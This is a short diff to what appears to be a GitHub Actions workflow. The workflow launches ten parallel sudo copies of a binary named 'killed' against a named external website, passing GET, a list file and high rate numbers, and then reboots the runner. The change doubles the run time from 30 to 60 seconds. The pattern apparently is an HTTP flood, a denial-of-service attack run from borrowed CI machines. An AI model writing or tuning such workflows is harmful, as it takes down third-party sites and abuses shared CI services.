@@ -18,7 +18,7 @@ jobs:
           chmod +x killed
           PIDS=()
           for i in {1..10}; do
-            sudo timeout 30 ./killed GET https://antifix.com.tr/ fres.txt 30 999 16 &
+            sudo timeout 60 ./killed GET https://antifix.com.tr/ fres.txt 60 999 16 &
             PIDS+=($!)
           done
           
@@ -27,7 +27,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 30
+        run: sleep 60
         
       - name: OK !
         run: sudo reboot
